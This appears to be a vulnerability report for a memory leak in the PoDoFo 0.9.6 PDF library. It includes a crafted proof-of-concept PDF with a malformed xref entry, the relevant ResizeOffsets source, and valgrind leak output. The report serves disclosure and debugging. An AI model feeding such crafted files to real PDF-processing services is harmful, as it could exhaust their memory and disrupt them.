memory leak
---------
$ podofopdfinfo mem-leak.pdf

file 
-------
$ cat mem-leak.pdf 
%PDF-1.5
1 0 obj
	<< /A 5
	/B 10
	/C 15
	>>
endobj
xref
0 2
0000000000 65535 f
0000000009 00000 n
0008388607 00000 n % s_nMaxObjects=0x7fffff
trailer
	<<
	/Root 5 0 R
	/Size 55
	>>
startxref
51
%%EOF

podofo-0.9.6/src/base/PdfParser.cpp:1454
void PdfParser::ResizeOffsets( pdf_long nNewSize )
{
    // allow caller to specify a max object count to avoid very slow load times on large documents
    if (nNewSize > s_nMaxObjects)
    {
        PODOFO_RAISE_ERROR_INFO( ePdfError_ValueOutOfRange,  "nNewSize is greater than m_nMaxObjects." );
    }
    
    m_offsets.resize( nNewSize );  
}

s_nMaxObjects = 0x7fffff(decimal:8388607)

valgrind
--------
==3761== HEAP SUMMARY:
==3761==     in use at exit: 100,669,844 bytes in 19 blocks
==3761==   total heap usage: 199,914 allocs, 199,895 frees, 237,548,704 bytes allocated
==3761== 
==3761== LEAK SUMMARY:
==3761==    definitely lost: 392 bytes in 1 blocks
==3761==    indirectly lost: 5,824 bytes in 16 blocks
==3761==      possibly lost: 100,663,284 bytes in 1 blocks
==3761==    still reachable: 344 bytes in 1 blocks
==3761==         suppressed: 0 bytes in 0 blocks



